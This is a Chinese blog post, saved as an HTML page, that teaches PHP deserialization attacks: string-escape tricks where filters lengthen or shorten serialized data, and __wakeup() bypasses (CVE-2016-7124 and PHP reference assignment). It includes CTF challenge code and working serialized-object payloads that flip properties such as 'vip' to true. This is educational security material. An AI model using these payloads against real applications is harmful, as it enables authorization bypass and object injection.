@@ -1,0 +1,510 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>php反序列化进阶 | lu1ux's blog</title><meta name="author" content="lu1ux"><meta name="copyright" content="lu1ux"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="一.字符串逃逸在反序列化中,成员属性数,成员属性名称长度和成员属性长度都需要与所提供的序列化字符串一致,否则在反序列化时会返回bool(false) 1234567&lt;?phpclass A&#123;    var $v1 &#x3D; &#x27;lu1ux&#x27;;    var $v2 &#x3D; &#x27;lulu&#x27;;&#125;echo serialize(new A());   序">
+<meta property="og:type" content="article">
+<meta property="og:title" content="php反序列化进阶">
+<meta property="og:url" content="http://example.com/2025/11/25/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9B%E9%98%B6/index.html">
+<meta property="og:site_name" content="lu1ux&#39;s blog">
+<meta property="og:description" content="一.字符串逃逸在反序列化中,成员属性数,成员属性名称长度和成员属性长度都需要与所提供的序列化字符串一致,否则在反序列化时会返回bool(false) 1234567&lt;?phpclass A&#123;    var $v1 &#x3D; &#x27;lu1ux&#x27;;    var $v2 &#x3D; &#x27;lulu&#x27;;&#125;echo serialize(new A());   序">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/img/4.jpg">
+<meta property="article:published_time" content="2025-11-25T13:26:49.000Z">
+<meta property="article:modified_time" content="2025-11-25T13:27:59.301Z">
+<meta property="article:author" content="lu1ux">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/4.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2025/11/25/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9B%E9%98%B6/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Error',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'php反序列化进阶',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2025-11-25 21:27:59'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><link rel="stylesheet" href="//at.alicdn.com/t/c/font_4066449_d5kq6u6u9dj.css"><link rel="stylesheet" href="/css/mine.css"><meta name="generator" content="Hexo 8.1.1"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">Loading...</div></div></div><script>(()=>{
+  const $loadingBox = document.getElementById('loading-box')
+  const $body = document.body
+  const preloader = {
+    endLoading: () => {
+      $body.style.overflow = ''
+      $loadingBox.classList.add('loaded')
+    },
+    initLoading: () => {
+      $body.style.overflow = 'hidden'
+      $loadingBox.classList.remove('loaded')
+    }
+  }
+
+  preloader.initLoading()
+  window.addEventListener('load',() => { preloader.endLoading() })
+
+  if (false) {
+    document.addEventListener('pjax:send', () => { preloader.initLoading() })
+    document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+  }
+})()</script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avator.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">23</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">14</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw iconfont icon-zhuye"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw iconfont icon-archive-solid"></i><span> 归档</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/4.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="lu1ux's blog"><span class="site-name">lu1ux's blog</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw iconfont icon-zhuye"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw iconfont icon-archive-solid"></i><span> 归档</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">php反序列化进阶</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-11-25T13:26:49.000Z" title="Created 2025-11-25 21:26:49">2025-11-25</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-11-25T13:27:59.301Z" title="Updated 2025-11-25 21:27:59">2025-11-25</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="php反序列化进阶"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="一-字符串逃逸"><a href="#一-字符串逃逸" class="headerlink" title="一.字符串逃逸"></a>一.字符串逃逸</h1><p>在反序列化中,<strong>成员属性数</strong>,<strong>成员属性名称长度</strong>和<strong>成员属性长度</strong>都需要与所提供的序列化字符串一致,否则在反序列化时会返回bool(false)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class A&#123;</span><br><span class="line">    var $v1 = &#x27;lu1ux&#x27;;</span><br><span class="line">    var $v2 = &#x27;lulu&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo serialize(new A());</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125212744844.png" alt="image-20241213210551681"></p>
+<p>序列化类A之后得到序列化字符串</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:1:&quot;A&quot;:2:&#123;s:2:&quot;v1&quot;;s:5:&quot;lu1ux&quot;;s:2:&quot;v2&quot;;s:4:&quot;lulu&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>通过长度判断反序列化其中字符是功能性字符还是字符串</p>
+<p>在<strong>前面字符串没有问题</strong>的时候,;}是反序列化结束符,后面的字符串不影响反序列化结果</p>
+<p><code>O:1:&quot;A&quot;:2:{s:2:&quot;v1&quot;;s:5:&quot;lu1ux&quot;;s:2:&quot;v2&quot;;s:4:&quot;lulu&quot;;}</code>与<code>O:1:&quot;A&quot;:2:{s:2:&quot;v1&quot;;s:5:&quot;lu1ux&quot;;s:2:&quot;v2&quot;;s:4:&quot;lulu&quot;;}12345678;}反序列化后的结果是一样的</code></p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125212744830.png" alt="image-20250106155601908"></p>
+<p>如果反序列化字符串中增加一个v3,缺少v2会怎么样呢?</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class A&#123;</span><br><span class="line">    var $v1 = &#x27;lu1ux&#x27;;</span><br><span class="line">    var $v2 = &#x27;lulu&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo serialize(new A());</span><br><span class="line"></span><br><span class="line">$b = &#x27;O:1:&quot;A&quot;:2:&#123;s:2:&quot;v1&quot;;s:5:&quot;lu1ux&quot;;s:2:&quot;v3&quot;;s:3:&quot;lhb&quot;;&#125;&#x27;;</span><br><span class="line">var_dump(unserialize($b));</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125212744725.png" alt="image-20250106154837559"></p>
+<p>发现反序列化后v1,v2,v3都成功显示了,其中v1,v3是从反序列化中赋的值,v2是从类A中赋的值</p>
+<h2 id="属性逃逸"><a href="#属性逃逸" class="headerlink" title="属性逃逸"></a>属性逃逸</h2><p>一般数据先经过一次serialize再经过一次unserialize,在这个中间反序列化的字符变多或者变少的时候才有可能存在反序列化属性逃逸</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125212744893.png" alt="image-20250106164059506"></p>
+<h4 id="字符串减少逃逸"><a href="#字符串减少逃逸" class="headerlink" title="字符串减少逃逸"></a>字符串减少逃逸</h4><p>例如下面这段代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class A&#123;</span><br><span class="line">    public $v1 = &quot;abcsystem()&quot;;</span><br><span class="line">    public $v2 = &#x27;123&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$data = serialize(new A());</span><br><span class="line">$data = str_replace(&quot;system()&quot;,&quot;&quot;,$data);</span><br><span class="line">var_dump(unserialize($data));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>其中的str_replace会把system()替换成空,再序列化和反序列化过程中会导致反序列化的字符变少</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125212744821.png" alt="image-20250106160948863"></p>
+<p>替换后成员属性的长度显然对不上,返回的是bool(false)</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125212744802.png" alt="image-20250106161234692"></p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125212745631.png" alt="image-20250106163243805"></p>
+<img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125212745547.png" alt="image-20250106162806297"  />
+
+
+
+
+
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125212745571.png" alt="image-20250106162823201"></p>
+<p>最终逃逸出v3</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125212745735.png" alt="image-20250106162541625"></p>
+<p>​                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    </p>
+<h4 id="字符串增加逃逸"><a href="#字符串增加逃逸" class="headerlink" title="字符串增加逃逸"></a>字符串增加逃逸</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class A&#123;</span><br><span class="line">    public $v1 = &#x27;ls&#x27;;</span><br><span class="line">    public $v2 = &#x27;123&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$data =  serialize(new A());</span><br><span class="line">$data = str_replace(&quot;ls&quot;,&quot;pwd&quot;,$data);</span><br><span class="line"></span><br><span class="line">var_dump(unserialize($data));</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125212745800.png" alt="image-20250106164544917"></p>
+<p>构造后反序列化字符串只有v1,v3 , v2作为无用字符不会被反序列化,返回的v2就是类A中的值</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125212745740.png" alt="image-20250106165938766"></p>
+<h4 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h4><h5 id="字符串逃逸-增加"><a href="#字符串逃逸-增加" class="headerlink" title="字符串逃逸_增加"></a>字符串逃逸_增加</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">function filter($name)&#123;</span><br><span class="line">    $safe=array(&quot;flag&quot;,&quot;php&quot;);</span><br><span class="line">    $name=str_replace($safe,&quot;hack&quot;,$name);</span><br><span class="line">    return $name;</span><br><span class="line">&#125;</span><br><span class="line">class test&#123;</span><br><span class="line">    var $user;</span><br><span class="line">    var $pass=&#x27;daydream&#x27;;</span><br><span class="line">    function __construct($user)&#123;</span><br><span class="line">        $this-&gt;user=$user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$param=$_GET[&#x27;param&#x27;];</span><br><span class="line">$param=serialize(new test($param));</span><br><span class="line">$profile=unserialize(filter($param));</span><br><span class="line"></span><br><span class="line">if ($profile-&gt;pass==&#x27;escaping&#x27;)&#123;</span><br><span class="line">    echo file_get_contents(&quot;flag.php&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>分析题目,发现GET传入一个param,在new test($param)的时候触发__construct()将$param的值传给$user,然后序列化传给$param</p>
+<p>随后$param的值经过filter过滤后,再反序列化赋值给$profile</p>
+<p>最后判断对象$profile的pass属性的值是否是escaping,如果是escaping的话输出flag</p>
+<p>发现整个代码中没有对pass属性进行操作的步骤,filter中把flag,php替换成从hack,发现php替换成hack会多一位,于是采用字符串增加逃逸去覆盖类test中的pass属性</p>
+<p>思路分析完毕后正式解题</p>
+<p>先把类test单独复制下来在本地更改$pass &#x3D; ‘escaping’ , 然后序列化得到字符串</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125212746421.png" alt="image-20250108125343485"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;test&quot;:2:&#123;s:4:&quot;user&quot;;s:5:&quot;lu1ux&quot;;s:4:&quot;pass&quot;;s:8:&quot;escaping&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125212746736.png" alt="image-20250108125738535"></p>
+<p>目标逃逸字符一共是29个,每个php被替换成hack会逃逸出一个,所以需要29个php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">param=phpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphp&quot;;s:4:&quot;pass&quot;;s:8:&quot;escaping&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125212746765.png" alt="image-20250108131157018"></p>
+<p>得到flag</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125212746988.png" alt="image-20250108131217708"></p>
+<h5 id="字符串逃逸-减少"><a href="#字符串逃逸-减少" class="headerlink" title="字符串逃逸_减少"></a>字符串逃逸_减少</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">function filter($name)&#123;</span><br><span class="line">    $safe=array(&quot;flag&quot;,&quot;php&quot;);</span><br><span class="line">    $name=str_replace($safe,&quot;hk&quot;,$name);</span><br><span class="line">    return $name;</span><br><span class="line">&#125;</span><br><span class="line">class test&#123;</span><br><span class="line">    var $user;</span><br><span class="line">    var $pass;</span><br><span class="line">    var $vip = false ;</span><br><span class="line">    function __construct($user,$pass)&#123;</span><br><span class="line">        $this-&gt;user=$user;</span><br><span class="line">    $this-&gt;pass=$pass;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$param=$_GET[&#x27;user&#x27;];</span><br><span class="line">$pass=$_GET[&#x27;pass&#x27;];</span><br><span class="line">$param=serialize(new test($param,$pass));</span><br><span class="line">$profile=unserialize(filter($param));</span><br><span class="line"></span><br><span class="line">if ($profile-&gt;vip)&#123;</span><br><span class="line">    echo file_get_contents(&quot;flag.php&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>读代码,发现传入一个user,一个pass,分别赋值给$param和$pass,然后替换类test中的$user和$pass,接着序列化类test赋值给$param,再然后通过filter过滤后再反序列化赋值给$profile,如果$profile中的vip的值为true,就回显flag</p>
+<p>这题flag被替换成hk,很明显的字符串减少逃逸</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125212746939.png" alt="image-20250108134746005"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;test&quot;:3:&#123;s:4:&quot;user&quot;;s:4:&quot;flag&quot;;s:4:&quot;pass&quot;;s:5:&quot;lu1ux&quot;;s:3:&quot;vip&quot;;b:1;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125212746672.png" alt="image-20250108135053057"></p>
+<p>发现要吃掉的部分有19个字符,10个flag会吃掉20个字符,于是构造的字符串第一位随便放一个别的字符</p>
+<p>把lu1ux改成<code>1&quot;;s:4:&quot;pass&quot;;s:5:&quot;lu1ux&quot;;s:3:&quot;vip&quot;;b:1;}</code></p>
+<p>这样序列化字符串就变成</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;test&quot;:3:&#123;s:4:&quot;user&quot;;s:40:&quot;flagflagflagflagflagflagflagflagflagflag&quot;;s:4:&quot;pass&quot;;s:41:&quot;1&quot;;s:4:&quot;pass&quot;;s:5:&quot;lu1ux&quot;;s:3:&quot;vip&quot;;b:1;&#125;&quot;;s:3:&quot;vip&quot;;b:0;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>替换后就变成</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;test&quot;:3:&#123;s:4:&quot;user&quot;;s:40:&quot;hkhkhkhkhkhkhkhkhkhk&quot;;s:4:&quot;pass&quot;;s:41:&quot;1&quot;;s:4:&quot;pass&quot;;s:5:&quot;lu1ux&quot;;s:3:&quot;vip&quot;;b:1;&#125;&quot;;s:3:&quot;vip&quot;;b:0;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125212747082.png" alt="image-20250108140114700"></p>
+<p>最终vip的值就为真</p>
+<p>最终的payload为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?user=flagflagflagflagflagflagflagflagflagflag&amp;pass=1&quot;;s:4:&quot;pass&quot;;s:5:&quot;lu1ux&quot;;s:3:&quot;vip&quot;;b:1;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125212747375.png" alt="image-20250108140251403"></p>
+<h1 id="二-wakeup-绕过"><a href="#二-wakeup-绕过" class="headerlink" title="二.__wakeup()绕过"></a>二.__wakeup()绕过</h1><h2 id="1-反序列化漏洞CVE-2016-7124"><a href="#1-反序列化漏洞CVE-2016-7124" class="headerlink" title="1.反序列化漏洞CVE-2016-7124"></a>1.反序列化漏洞CVE-2016-7124</h2><p>版本要求:</p>
+<p>PHP5&lt;5.6.25</p>
+<p>PHP7&lt;7.0.10</p>
+<p>漏洞产生原因:<br>如果存在<code>__wakeup</code>方法,调用unserialize()方法,但是序列化字符串中表示对象属性个数的值大于真实的属性个数时,会跳过对<code>__wakeup()</code>的执行</p>
+<h2 id="2-php引用赋值"><a href="#2-php引用赋值" class="headerlink" title="2.php引用赋值&amp;"></a>2.php引用赋值&amp;</h2><p>在php里，我们可使用引用的方式让两个变量同时指向同一个内存地址，这样对其中一个变量操作时，另一个变量的值也会随之改变。</p>
+<p>例题</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class KeyPort&#123;</span><br><span class="line">    public $key;</span><br><span class="line"></span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;key=False;</span><br><span class="line">        if(!isset($this-&gt;wakeup)||!$this-&gt;wakeup)&#123;</span><br><span class="line">            echo &quot;You get it!&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        $this-&gt;wakeup=True;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&#x27;pop&#x27;]))&#123;</span><br><span class="line"></span><br><span class="line">    @unserialize($_POST[&#x27;pop&#x27;]);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>可以看到如果我们想触发echo必须首先满足:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(!isset($this-&gt;wakeup)||!$this-&gt;wakeup)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>也就是说要么不给wakeup赋值，让它接受不到$this-&gt;wakeup，要么控制wakeup为false，但我们注意到<code>__wakeup()</code>，这里使$this-&gt;wakeup&#x3D;True;，我们知道在用unserialize()反序列化字符串时，会先触发__wakeup()，然后再进行反序列化，所以相当于我们刚进行反序列化$this-&gt;wakeup就等于True了，这就没办法达到我们控制wake为false的想法了</p>
+<p>因此这里的难点其实就是这个__wakeup()绕过，我们可以使用上面提到过的引用赋值的方法以此将wakeup和key的值进行引用，让key的值改变的时候也改变wakeup的值即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class KeyPort&#123;</span><br><span class="line">    public $key;</span><br><span class="line">    public $wakeup;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$keyport = new KeyPort();</span><br><span class="line">$keyport-&gt;key=&amp;$keyport-&gt;wakeup;</span><br><span class="line">echo serialize($keyport);</span><br></pre></td></tr></table></figure>
+
+
+
+<p>得到序列化字符串</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:7:&quot;KeyPort&quot;:2:&#123;s:3:&quot;key&quot;;N;s:6:&quot;wakeup&quot;;R:2;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125212747478.png" alt="image-20250110170333986"></p>
